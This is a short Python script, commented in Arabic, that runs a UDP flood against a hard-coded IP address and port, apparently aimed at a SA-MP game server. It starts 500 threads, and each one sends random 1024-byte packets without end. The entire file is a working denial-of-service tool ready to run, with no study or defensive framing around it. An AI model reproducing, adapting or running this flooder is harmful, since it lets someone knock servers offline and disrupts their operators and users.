import socket
import threading
import random
import time

target_ip = '23.88.73.88'  # حدد عنوان IP للسيرفر الهدف
target_port = 16414  # حدد المنفذ الهدف (عادةً ما يكون 7777 لـ SAMP)
num_threads = 500  # عدد الخيوط

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = random._urandom(1024)
        addr = (str(target_ip), int(target_port))
        s.sendto(data, addr)
        s.close()

for i in range(num_threads):
    thread = threading.Thread(target=attack)
    thread.start()
    time.sleep(0.1)  # إضافة تأخير بسيط لتجنب حظر الخيوط
